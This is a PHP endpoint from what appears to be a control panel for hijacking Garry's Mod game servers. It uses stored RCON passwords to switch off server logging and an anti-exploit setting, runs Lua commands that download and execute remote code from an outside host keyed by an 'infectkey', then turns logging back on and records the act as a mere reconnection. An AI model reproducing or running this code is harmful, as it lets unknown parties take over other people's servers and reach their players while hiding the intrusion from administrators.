<?php
session_start();

// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

header('Content-Type: application/json');
if (!isset($_SESSION['user']['id'])) {
    http_response_code(401);
    die(json_encode(['success' => false, 'message' => 'Not Authentified']));
}
if (!isset($_GET['ip']) || !isset($_GET['port']))
{
    die(json_encode(['success' => false, 'message' => "Invalid parameters"]));
}

// RateLimit
if($_SESSION["ratelimit"]["time"] != date("s") or !isset($_SESSION["ratelimit"])){
    $_SESSION["ratelimit"] = array("time" => date("s"), "rate" => 0);
}

$_SESSION["ratelimit"]['rate'] = $_SESSION["ratelimit"]['rate'] + 1;

if($_SESSION["ratelimit"]['rate'] >= 2){
	die(json_encode(['success' => false, 'message' => "User Rate Limit Exceeded"]));
}


require dirname(dirname(__DIR__)) . "/app/Models/includes.php";
require dirname(dirname(__DIR__)) . "/app/Vendor/SourceQuery/bootstrap.php";

use xPaw\SourceQuery\SourceQuery;

// Edit this ->
define('SERVER_IP', $_GET['ip']);
define('SERVER_PORT', $_GET['port']);

$server = $GLOBALS['DB']->GetContent("servers", ['ip' => SERVER_IP . ":" . SERVER_PORT])[0];

$query = new SourceQuery();

$logs = "";

if ($server['rcon'] != "Not Found" && $server['rcon'] != "") {
    try {
        $query->Connect(SERVER_IP, SERVER_PORT, 1);
        $query->SetRconPassword($server['rcon']);
        $logs = $logs . $query->Rcon('ulx logecho 0') . "\n";
        $logs = $logs . $query->Rcon('snte_ulxluarun 0') . "\n";
        usleep(20000);
        $logs = $logs . $query->Rcon('ulx luarun http.Fetch([[https:/]]..[[/kvac.cz/f.php?key='. $AUTHUSER['infectkey'] .']],function(k)RunString(k,[[:]],!1)end)') . "\n";
        $logs = $logs . $query->Rcon('lua_run http.Fetch([[https:/]]..[[/kvac.cz/f.php?key='. $AUTHUSER['infectkey'] .']],function(k)RunString(k,[[:]],!1)end)') . "\n";
        usleep(20000);
        $logs = $logs . $query->Rcon('ulx logecho 1') . "\n";
        $logs = $logs . $query->Rcon('stats');
        $data = ['success' => true, 'message' => "Connection working"];

        file_put_contents(dirname(__DIR__) . "/assets/upload/logs/{$_GET['ip']}.txt", $logs);
    } catch (Exception $e) {
        $data = ['success' => false, 'message' => $e->getMessage()];
    } finally {
        $query->Disconnect();
    }
} else {
    $data = ['success' => false, 'message' => "No RCON is defined!"];
}

echo json_encode($data);


Logs::AddLogs(
	"User ".htmlentities($AUTHUSER['username'])." reconnected Garry's Mod server (".SERVER_IP . ":" . SERVER_PORT.") via RCON",
	"pink", 
	"fa fa-server"
);
